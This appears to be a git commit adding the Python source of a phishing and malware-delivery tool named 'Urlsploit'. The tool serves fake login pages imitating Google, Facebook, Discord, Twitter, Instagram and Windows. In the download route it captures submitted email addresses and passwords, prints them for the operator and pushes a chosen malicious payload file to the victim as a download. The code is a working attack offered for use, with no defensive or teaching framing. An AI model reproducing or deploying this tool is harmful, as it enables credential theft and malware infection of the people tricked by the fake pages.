9ae3a3fe7f7f8da5e68d07878c5edbba57f715cf
KAR13MA090 <Kar13ma09@gmail.com>
2024-12-19 20:10:13 +0700

    Add files via upload

---
+++ core/url_main.py
@@ -0,0 +1,98 @@
+from flask import Flask, render_template, request, send_file
+import flask
+import _thread
+from colorama import Fore, Style
+import colorama
+import time, os, sys
+
+# TODO: 
+# User opens link
+# Automatic download starts
+# Legit looking page.
+
+colorama.init()
+# TODO-STARTUP : 
+# Animated intro (5 secs) 
+tag_ok = "["+Style.BRIGHT+Fore.GREEN +"+"+Style.RESET_ALL+"]"
+tag_notok = "["+Style.BRIGHT+Fore.RED +"-"+Style.RESET_ALL+"]"
+tag_hm = "["+Style.BRIGHT+Fore.LIGHTCYAN_EX +"^"+Style.RESET_ALL+"]"
+
+templates = [
+            "google",
+             "facebook",
+             "discordapp",
+             "twitter",
+             "instagram",
+             "windows"
+            ]
+
+def checkTemplate(template_name):
+    if(template_name in templates):
+        return True
+    else:
+        return False
+
+def clear():
+    if(os.name == "nt"): 
+        os.system("cls")
+    else:
+        os.system("clear")
+
+def AnimateIntro():
+    
+    banner = [
+        "\n                                       \n"
+        "  ██╗   ██╗██████╗ ██╗      ████████╗\n"
+        "  ██║   ██║██╔══██╗██║      ╚══██╔══╝\n"
+        "  ██║   ██║██████╔╝██║         ██║   \n"
+        "  ██║   ██║██╔══██╗██║         ██║   \n"
+        "  ╚██████╔╝██║  ██║███████╗    ██║   \n"
+        "   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝   \n"
+        "                          Version 1 by KAR13MA09   \n"                               
+    
+    ]
+    clear()
+    for b in banner:          
+        for c in b:          
+            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + c + Style.RESET_ALL, end='')    
+            sys.stdout.flush()  
+            time.sleep(0.001)          
+    print('')  
+
+
+def WebServer(mode, payload):
+    app = Flask("Urlsploit", template_folder="templates")
+    app.static_folder = 'static'
+    global index_file
+    if(mode == "google"):
+        index_file = "google.html"
+    elif(mode == "facebook"):
+        index_file = "facebook.html"
+    elif(mode == "discordapp"):
+        index_file = "discord.html"
+    elif(mode == "twitter"):
+        index_file = "twitter.html"
+    elif(mode == "instagram"):
+        index_file = "instagram.html"
+    elif(mode == "windows"):
+        index_file = "windows.html"
+    else:
+        print(tag_notok + " Error : Mode not found.")
+
+    @app.route("/")
+    def main():
+        return render_template(index_file)
+        
+
+    @app.route("/download", methods=["POST"])
+    def download():
+        if(request.method == "POST"):
+            winEmail = request.form.get('email')
+            winPass = request.form.get('password')
+            print(tag_ok + " POST : {e}".format(e=winEmail))
+            print(tag_ok + " POST : {p}".format(p=winPass))
+            return send_file(payload, as_attachment=True)
+        
+
+
+    app.run(host="127.0.0.1", port=80)
---
+++ ulr.py
@@ -0,0 +1,34 @@
+from core.url_main import *
+import argparse
+def main():
+    AnimateIntro()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--t", "-template", required=True,help="The template to use.")
+    parser.add_argument("--p", "-payload", required=True, help="The path of payload to send.")
+    args = parser.parse_args()
+    
+    template = args.t
+    payload = args.p
+    
+    print(tag_ok + " Starting URLKAR13MA09 with Template '{t}' and payload '{payload}'.".format(t=template, payload=payload))
+    print(tag_hm + " Checking if tempalate '{t}' is valid..".format(t=template))
+    if(checkTemplate(template) == True):
+        print(tag_ok + " Template is valid!")
+    else:
+        print(tag_notok + " Template '{er}' not found!? Available ones are.".format(er=template))
+        for i in range(len(templates)):
+            print(tag_hm + " Template : {ts}".format(ts=templates[i]))
+        print(tag_ok + " Use URLKAR13MA09 -template <template name> -payload <payload path>")
+        exit(True)
+
+    print(tag_hm + " Checking if payload '{p}' is valid..".format(p=payload))
+    try:
+        malacious_file = open(payload, "rb")
+        malacious_file.close()
+        print(tag_ok + " Payload is valid!")
+        WebServer(template, payload)
+    except FileNotFoundError:
+        print(tag_notok + " '{p}' not found.".format(p=payload))
+        print(tag_ok + " Use URLKAR13MA09 -template <template name> -payload <payload path>")
+        exit(True)
+main()
